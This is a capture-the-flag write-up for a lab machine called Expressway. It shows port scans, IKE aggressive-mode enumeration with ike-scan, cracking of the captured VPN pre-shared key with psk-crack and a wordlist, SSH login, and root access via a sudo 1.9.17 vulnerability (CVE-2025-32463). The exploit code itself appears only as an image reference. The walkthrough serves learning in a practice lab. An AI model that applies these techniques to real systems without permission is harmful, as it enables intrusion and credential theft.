# **Expressway: Writeup & Solution**

## **1. Initial Enumeration**

### **TCP Port Scanning**

First, I performed a scan of all TCP ports on the machine.

```Shell
nmap -p 22 -sS -Pn -n --min-rate 5000 -sV -sC 10.129.238.52
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 11:34 EST
Nmap scan report for 10.129.238.52
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.07 seconds
```

So, this is strange because it's not common to just find the SSH port open on an HTB machine. I decided to scan the UDP ports in case I found any surprises.

### **UDP Port Scanning**

```Shell
nmap -p- -sU --min-rate 5000 10.129.238.52                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 11:37 EST
Warning: 10.129.238.52 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.238.52
Host is up (0.10s latency).
Not shown: 65384 open|filtered udp ports (no-response), 150 closed udp ports (port-unreach)
PORT    STATE SERVICE
500/udp open  isakmp

Nmap done: 1 IP address (1 host up) scanned in 152.22 seconds
```

Here, we found port **500/UDP** open with the **isakmp** service running on it. After researching, it turns out that port 500/UDP belongs to the IPsec service, which is responsible for LAN-to-LAN connectivity for corporate VPNs.

To create a **Security Association (SA)** between these networks, the **IKE** protocol is used, and for authentication and key exchange, **ISAKMP** is utilized. This type of connection is divided into three parts:

1. **Secure Channel Creation**: A secure channel is created between two endpoints using a **PSK** (Pre-Shared Key), which is a password known only to those two devices.
2. **Identity Verification**: This is when the person’s identity is verified using a username and password.
3. **Connection Protection**: Once this is done, the connection is further protected using other encryption algorithms.

---

## **2. Service Enumeration**

Once I understood what this service consisted of, I checked the **Hacktricks** platform to review the enumeration steps for this service. First, I found a useful tool for this: `ike-scan`.

```Shell
ike-scan -M -A 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned
        HDR=(CKY-R=c605d2104088ad31)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.114 seconds (8.81 hosts/sec).  1 returned handshake; 0 returned notify
```

**Key findings from enumeration:**

- Confirmed the use of **PSK** and the encryption types utilized.
- Identified the user **ike** and the domain of this IP.

With the username, I could now enumerate the hash and crack it on my Kali machine. But first, I needed to specify the host by configuring it in the `/etc/hosts` file.

```Shell
ike-scan -M -A -n ike@expressway.htb --pskcrack=hash.txt 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned
        HDR=(CKY-R=fd8d6f4fe4090480)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.114 seconds (8.76 hosts/sec).  1 returned handshake; 0 returned notify
```

---

## **3. Exploitation & Foothold**

The hash is inside the `hash.txt` file for the user **ike**, so I proceeded to crack it using `psk-crack`.

```Shell
┌──(kali㉿kali)-[~]
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 71c602aa67d01705d5a3c1ce22dd8fee640e1fd8
Ending psk-crack: 8045040 iterations in 10.533 seconds (763810.61 iterations/sec)
```

With the cracked password, I logged into the SSH service discovered earlier to obtain the **user flag**.

```Bash
┌──(kali㉿kali)-[~]
└─$ ssh ike@expressway.htb       
...'
ike@expressway.htb's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 28 21:44:50 2026 from 10.10.14.106
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt
```

---

## **4. Privilege Escalation**

At this point, I enumerated system information and the `ike` user's directory.

```Bash
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
ike@expressway:~$ find ./ -user ike 2>/dev/null
./
./.bashrc
./.bash_logout
./.ssh
./.ssh/known_hosts
./.ssh/authorized_keys
./.ssh/id_rsa
./.ssh/id_rsa.pub
./.local
./.local/share
./.local/share/nano
./.profile
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

When I did this, I performed standard privilege escalation checks—checking sudo permissions with `sudo -l` and listing files with SUID permissions using `find / -perm -4000 2>/dev/null`—but I couldn't find anything.

Since I found myself stuck, I checked a writeup for a hint, and in it, I paid attention to the **sudo version**. It turns out there is a vulnerability, **CVE-2025-32463**, that specifically affects version 1.9.17 of sudo, and I found the following file to exploit this vulnerability.

![[Pasted image 20260228173958.png|300|center|637]]

I created the file using the `nano` tool to become root.

```Bash
ike@expressway:~$ nano exploit.sh
ike@expressway:~$ chmod +x exploit.sh 
ike@expressway:~$ ./exploit.sh 
woot!
root@expressway:/# ls /root/root.txt
/root/root.txt
```